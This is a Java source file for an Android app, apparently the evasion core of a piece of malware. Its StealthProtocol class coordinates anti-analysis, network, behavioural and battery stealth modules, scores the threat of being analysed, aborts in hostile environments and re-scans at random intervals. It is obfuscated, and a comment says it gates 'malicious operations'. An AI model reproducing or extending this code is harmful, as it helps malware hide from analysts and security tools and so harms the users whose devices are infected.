package com.seguranca.protecao.stealth;

import android.content.Context;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;
import org.lsposed.lsparanoid.Obfuscate;

/**
 * Coordenador central do Protocolo Stealth.
 * Gerencia todos os sub-módulos de evasão e adapta o nível de ameaça dinamicamente.
 */
@Obfuscate
public class StealthProtocol {

    private static final String TAG = "SP";
    private static volatile StealthProtocol sInstance;

    private Context appContext;
    private NetworkStealth networkStealth;
    private BehavioralStealth behavioralStealth;
    private AntiAnalysis antiAnalysis;
    private BatteryStealth batteryStealth;

    private HandlerThread monitorThread;
    private Handler monitorHandler;
    private volatile boolean isActive = false;
    private volatile int currentThreatLevel = 0;

    // Threat level thresholds
    public static final int THREAT_NORMAL = 0;
    public static final int THREAT_CAUTIOUS = 25;
    public static final int THREAT_ELEVATED = 50;
    public static final int THREAT_HIGH = 75;
    public static final int THREAT_CRITICAL = 90;

    // Response modes
    public static final int MODE_NORMAL = 0;
    public static final int MODE_STEALTH = 1;
    public static final int MODE_PARANOID = 2;
    public static final int MODE_ABORT = 3;

    private volatile int currentMode = MODE_NORMAL;

    private StealthProtocol() {}

    public static StealthProtocol getInstance() {
        if (sInstance == null) {
            synchronized (StealthProtocol.class) {
                if (sInstance == null) {
                    sInstance = new StealthProtocol();
                }
            }
        }
        return sInstance;
    }

    /**
     * Inicializa todo o protocolo stealth. Deve ser chamado no Application.onCreate().
     * @return true se ambiente seguro, false se ameaça crítica detectada
     */
    public boolean initialize(Context context) {
        this.appContext = context.getApplicationContext();

        try {
            // Inicializa sub-módulos
            antiAnalysis = new AntiAnalysis(appContext);
            networkStealth = new NetworkStealth(appContext);
            behavioralStealth = new BehavioralStealth(appContext);
            batteryStealth = new BatteryStealth(appContext);

            // Scan inicial de ameaças
            currentThreatLevel = antiAnalysis.getThreatLevel();
            Log.d(TAG, "Threat level inicial: " + currentThreatLevel);

            // Decide modo baseado no threat level
            updateMode();

            if (currentMode == MODE_ABORT) {
                Log.w(TAG, "Ambiente hostil detectado - modo ABORT");
                return false;
            }

            // Inicia sub-módulos
            networkStealth.start();
            batteryStealth.startDutyCycle();

            // Inicia monitor periódico de ameaças
            startThreatMonitor();

            isActive = true;
            Log.d(TAG, "Protocolo Stealth ativo - modo: " + currentMode);
            return true;

        } catch (Exception e) {
            Log.e(TAG, "Erro na inicialização: " + e.getMessage());
            return true; // Continua operando mesmo com erro
        }
    }

    private void updateMode() {
        if (currentThreatLevel >= THREAT_CRITICAL) {
            currentMode = MODE_ABORT;
        } else if (currentThreatLevel >= THREAT_HIGH) {
            currentMode = MODE_PARANOID;
        } else if (currentThreatLevel >= THREAT_CAUTIOUS) {
            currentMode = MODE_STEALTH;
        } else {
            currentMode = MODE_NORMAL;
        }
    }

    private void startThreatMonitor() {
        monitorThread = new HandlerThread("ThreatMon");
        monitorThread.start();
        monitorHandler = new Handler(monitorThread.getLooper());

        monitorHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                try {
                    if (!isActive) return;

                    int newLevel = antiAnalysis.getThreatLevel();
                    if (Math.abs(newLevel - currentThreatLevel) > 5) {
                        currentThreatLevel = newLevel;
                        updateMode();
                        adaptAllModules();
                        Log.d(TAG, "Threat atualizado: " + currentThreatLevel + " modo: " + currentMode);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Monitor erro: " + e.getMessage());
                }

                // Re-scan a cada 60-180s (aleatório)
                long delay = 60000 + (long)(Math.random() * 120000);
                monitorHandler.postDelayed(this, delay);
            }
        }, 30000); // Primeiro scan após 30s
    }

    private void adaptAllModules() {
        try {
            if (networkStealth != null) {
                networkStealth.setStealthLevel(currentMode);
            }
            if (behavioralStealth != null) {
                behavioralStealth.setStealthLevel(currentMode);
            }
            if (batteryStealth != null) {
                batteryStealth.setStealthLevel(currentMode);
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro adaptando módulos: " + e.getMessage());
        }
    }

    /**
     * Adapta manualmente o nível de ameaça.
     */
    public void adaptThreatLevel(int level) {
        this.currentThreatLevel = Math.max(0, Math.min(100, level));
        updateMode();
        adaptAllModules();
    }

    public NetworkStealth getNetworkStealth() { return networkStealth; }
    public BehavioralStealth getBehavioralStealth() { return behavioralStealth; }
    public AntiAnalysis getAntiAnalysis() { return antiAnalysis; }
    public BatteryStealth getBatteryStealth() { return batteryStealth; }
    public int getCurrentThreatLevel() { return currentThreatLevel; }
    public int getCurrentMode() { return currentMode; }
    public boolean isActive() { return isActive; }

    /**
     * Verifica se operações maliciosas devem ser executadas no modo atual.
     */
    public boolean shouldOperate() {
        return isActive && currentMode != MODE_ABORT;
    }

    /**
     * Verifica se comunicação de rede deve usar stealth.
     */
    public boolean shouldUseStealth() {
        return currentMode >= MODE_STEALTH;
    }

    public void shutdown() {
        isActive = false;
        try {
            if (networkStealth != null) networkStealth.stop();
            if (batteryStealth != null) batteryStealth.stopDutyCycle();
            if (monitorThread != null) monitorThread.quitSafely();
        } catch (Exception e) {
            Log.e(TAG, "Erro no shutdown: " + e.getMessage());
        }
    }
}
